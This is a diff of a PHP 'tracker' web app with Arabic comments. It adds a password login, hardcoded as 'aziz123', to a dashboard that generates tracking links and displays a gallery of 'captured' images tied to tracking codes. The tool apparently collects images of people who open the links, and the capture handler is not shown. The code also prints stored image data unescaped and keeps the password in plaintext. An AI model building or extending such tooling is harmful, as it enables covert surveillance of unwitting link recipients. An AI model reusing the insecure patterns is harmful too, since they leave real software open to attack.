@@ -1,8 +1,28 @@
 <?php
 date_default_timezone_set('Africa/Algiers');
+session_start();
 
 ini_set('display_errors', 0);
 error_reporting(0);
+
+// التحقق من تسجيل الدخول
+$password_correct = 'aziz123';
+
+if (isset($_POST['login_password'])) {
+    if ($_POST['login_password'] === $password_correct) {
+        $_SESSION['authenticated'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit();
+    } else {
+        $login_error = "كلمة المرور غير صحيحة!";
+    }
+}
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit();
+}
 
 try {
     $db = new PDO('sqlite:tracker_pro.db');
@@ -27,8 +47,8 @@ try {
     die("Database Error");
 }
 
-// معالجة طلبات الحذف
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+// معالجة طلبات الحذف (يتطلب مصادقة)
+if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['delete_id'])) {
         $id_to_delete = intval($_POST['delete_id']);
         $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
@@ -109,7 +129,7 @@ if (isset($_GET['r'])) {
 
 $generated_link = "";
 $tracking_code = "";
-if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
+if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
     if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
         $target_url = "https://" . $target_url;
@@ -229,14 +249,15 @@ endif;
         h2 { font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); margin-bottom: 16px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }
 
         .form-control { display: flex; gap: 10px; }
-        input[type="text"] { flex: 1; background: #020617; border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; color: var(--text); font-size: 14px; outline: none; transition: border 0.2s; }
-        input[type="text"]:focus { border-color: var(--accent); }
+        input[type="text"], input[type="password"] { flex: 1; background: #020617; border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; color: var(--text); font-size: 14px; outline: none; transition: border 0.2s; }
+        input[type="text"]:focus, input[type="password"]:focus { border-color: var(--accent); }
         
         .btn { background: var(--accent); color: white; border: none; padding: 0 20px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; text-decoration: none; transition: background 0.2s; }
         .btn:hover { background: var(--accent-hover); }
         .btn-danger { background: var(--danger); color: white; }
         .btn-danger:hover { background: var(--danger-hover); }
         .btn-secondary { background: #334155; }
+        .btn-secondary:hover { background: #475569; }
         
         .output-box { background: #020617; border: 1px solid var(--border); padding: 16px; border-radius: 8px; margin-top: 15px; }
         .output-box label { display: block; font-size: 10px; text-transform: uppercase; color: var(--muted); margin-bottom: 6px; }
@@ -251,75 +272,103 @@ endif;
         .btn-delete-single { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid var(--danger); padding: 6px 10px; border-radius: 6px; font-size: 11px; cursor: pointer; margin-top: 10px; width: 100%; transition: all 0.2s; font-weight: 600; }
         .btn-delete-single:hover { background: var(--danger); color: white; }
 
+        .login-wrapper { display: flex; justify-content: center; align-items: center; height: 80vh; }
+        .login-card { max-width: 400px; width: 100%; text-align: center; }
+        .error-msg { color: var(--danger); font-size: 12px; margin-bottom: 12px; }
+
+        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+
         footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--muted); border-top: 1px solid var(--border); padding-top: 20px; }
         footer span { color: var(--accent); font-weight: 600; }
     </style>
 </head>
 <body>
     <div class="container">
-        
-        <div class="panel">
-            <h2>Generate Secure Link</h2>
-            <form method="POST" class="form-control">
-                <input type="text" name="target_url" placeholder="Target Destination URL..." required>
-                <button type="submit" name="create" class="btn">Generate</button>
-            </form>
 
-            <?php if (!empty($generated_link)): ?>
-                <div class="output-box">
-                    <label>Active Tracking URL:</label>
-                    <div class="flex-row">
-                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
-                        <button type="button" class="btn btn-secondary" onclick="navigator.clipboard.writeText('<?php echo htmlspecialchars($generated_link); ?>')">Copy</button>
-                    </div>
-                </div>
-            <?php endif; ?>
-        </div>
-
-        <div class="panel">
-            <div class="gallery-header">
-                <h2>Captured Gallery</h2>
-                <?php if (!empty($captures)): ?>
-                    <form method="POST" onsubmit="return confirm('هل أنت متأكد من رغبتك في حذف جميع الصور المعروضة؟');">
-                        <input type="hidden" name="delete_all" value="1">
-                        <input type="hidden" name="track_code" value="<?php echo htmlspecialchars($filter_code); ?>">
-                        <button type="submit" class="btn btn-danger" style="height: 36px; font-size: 12px; padding: 0 14px;">حذف الكل</button>
+        <?php if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true): ?>
+            <!-- نموذج تسجيل الدخول -->
+            <div class="login-wrapper">
+                <div class="panel login-card">
+                    <h2>Secure Terminal Access</h2>
+                    <?php if (isset($login_error)): ?>
+                        <div class="error-msg"><?php echo $login_error; ?></div>
+                    <?php endif; ?>
+                    <form method="POST" style="display: flex; flex-direction: column; gap: 12px;">
+                        <input type="password" name="login_password" placeholder="Enter Password..." required autofocus>
+                        <button type="submit" class="btn" style="width: 100%;">Login</button>
                     </form>
+                </div>
+            </div>
+        <?php else: ?>
+            <!-- لوحة التحكم الكاملة -->
+            <div class="top-bar">
+                <h1 style="font-size: 16px; color: var(--text);">Secure Terminal Dashboard</h1>
+                <a href="?logout=1" class="btn btn-secondary" style="height: 36px; font-size: 12px; padding: 0 14px; text-decoration: none;">تسجيل الخروج</a>
+            </div>
+            
+            <div class="panel">
+                <h2>Generate Secure Link</h2>
+                <form method="POST" class="form-control">
+                    <input type="text" name="target_url" placeholder="Target Destination URL..." required>
+                    <button type="submit" name="create" class="btn">Generate</button>
+                </form>
+
+                <?php if (!empty($generated_link)): ?>
+                    <div class="output-box">
+                        <label>Active Tracking URL:</label>
+                        <div class="flex-row">
+                            <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
+                            <button type="button" class="btn btn-secondary" onclick="navigator.clipboard.writeText('<?php echo htmlspecialchars($generated_link); ?>')">Copy</button>
+                        </div>
+                    </div>
                 <?php endif; ?>
             </div>
 
-            <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
-                <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>">
-                <button type="submit" class="btn">Filter</button>
-                <?php if(!empty($filter_code)): ?>
-                    <a href="/" class="btn btn-secondary" style="text-decoration:none; display:flex; align-items:center;">Reset</a>
-                <?php endif; ?>
-            </form>
-
-            <?php if (empty($captures)): ?>
-                <p style="text-align: center; color: var(--muted); padding: 30px;">No captures recorded.</p>
-            <?php else: ?>
-                <div class="gallery">
-                    <?php foreach ($captures as $cap): ?>
-                        <div class="item-card">
-                            <div>
-                                <a href="<?php echo $cap['image_data']; ?>" target="_blank">
-                                    <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
-                                </a>
-                                <div class="meta-info">
-                                    <span class="code-tag"><?php echo htmlspecialchars($cap['code']); ?></span>
-                                    <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
-                                </div>
-                            </div>
-                            <form method="POST" onsubmit="return confirm('هل تريد حذف هذه الصورة بالتحديد؟');">
-                                <input type="hidden" name="delete_id" value="<?php echo $cap['id']; ?>">
-                                <button type="submit" class="btn-delete-single">حذف الصورة</button>
-                            </form>
-                        </div>
-                    <?php endforeach; ?>
+            <div class="panel">
+                <div class="gallery-header">
+                    <h2>Captured Gallery</h2>
+                    <?php if (!empty($captures)): ?>
+                        <form method="POST" onsubmit="return confirm('هل أنت متأكد من رغبتك في حذف جميع الصور المعروضة؟');">
+                            <input type="hidden" name="delete_all" value="1">
+                            <input type="hidden" name="track_code" value="<?php echo htmlspecialchars($filter_code); ?>">
+                            <button type="submit" class="btn btn-danger" style="height: 36px; font-size: 12px; padding: 0 14px;">حذف الكل</button>
+                        </form>
+                    <?php endif; ?>
                 </div>
-            <?php endif; ?>
-        </div>
+
+                <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
+                    <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>">
+                    <button type="submit" class="btn">Filter</button>
+                    <?php if(!empty($filter_code)): ?>
+                        <a href="/" class="btn btn-secondary" style="text-decoration:none; display:flex; align-items:center;">Reset</a>
+                    <?php endif; ?>
+                </form>
+
+                <?php if (empty($captures)): ?>
+                    <p style="text-align: center; color: var(--muted); padding: 30px;">No captures recorded.</p>
+                <?php else: ?>
+                    <div class="gallery">
+                        <?php foreach ($captures as $cap): ?>
+                            <div class="item-card">
+                                <div>
+                                    <a href="<?php echo $cap['image_data']; ?>" target="_blank">
+                                        <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
+                                    </a>
+                                    <div class="meta-info">
+                                        <span class="code-tag"><?php echo htmlspecialchars($cap['code']); ?></span>
+                                        <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
+                                    </div>
+                                </div>
+                                <form method="POST" onsubmit="return confirm('هل تريد حذف هذه الصورة بالتحديد؟');">
+                                    <input type="hidden" name="delete_id" value="<?php echo $cap['id']; ?>">
+                                    <button type="submit" class="btn-delete-single">حذف الصورة</button>
+                                </form>
+                            </div>
+                        <?php endforeach; ?>
+                    </div>
+                <?php endif; ?>
+            </div>
+        <?php endif; ?>
 
     </div>
 
